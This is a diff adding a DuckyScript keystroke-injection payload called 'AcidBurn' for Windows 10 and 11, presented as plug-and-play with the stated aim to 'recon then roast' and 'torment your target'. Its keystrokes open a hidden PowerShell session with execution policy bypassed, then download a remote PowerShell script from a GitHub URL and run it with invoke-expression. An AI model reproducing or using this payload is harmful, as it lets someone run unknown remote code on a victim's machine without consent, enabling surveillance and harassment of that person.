@@ -1,0 +1,16 @@
+REM     Title: AcidBurn
+REM
+REM     Author: I am Jakoby
+REM
+REM     Description: This payload is meant to torment your target to the fullest extent. Mission to recon then roast. See README.md for more details
+REM
+REM     Target: Windows 10, 11
+REM
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+REM
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-AcidBurn/AcidBurn.ps1?dl=1; invoke-expression $pl
+ENTER
